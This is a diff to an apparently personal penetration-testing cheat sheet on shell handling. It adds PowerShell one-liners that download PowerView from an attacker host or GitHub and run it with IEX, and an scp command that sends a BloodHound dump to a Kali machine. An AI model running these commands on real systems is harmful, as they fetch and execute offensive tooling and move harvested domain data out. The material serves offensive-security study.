@@ -34,6 +34,24 @@ export TERM=xterm-256color
 stty rows <num> columns <cols>
 ```
 
+## \*Linux to Windows
+
+```bash
+#from Linux to Windows
+#Local
+(new-object system.net.webclient).downloadstring('http://192.168.1.1/powerview.ps1') | IEX
+#Remotly
+(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1') | IEX
+```
+
+## \*Windows to Linux <a href="#windows-to-linux" id="windows-to-linux"></a>
+
+```bash
+scp local_file username@hostname_or_ip:/remote/path
+#Example
+scp 20240830124156_BloodHound.zip kali@10.50.57.149:/var/www/uploads
+```
+
 ## Method 1: Python pty module <a href="#method-1-python-pty-module" id="method-1-python-pty-module"></a>
 
 One of my go-to commands for a long time after catching a dumb shell was to use Python to spawn a pty. The [pty module](https://docs.python.org/2/library/pty.html) let’s you spawn a psuedo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command:
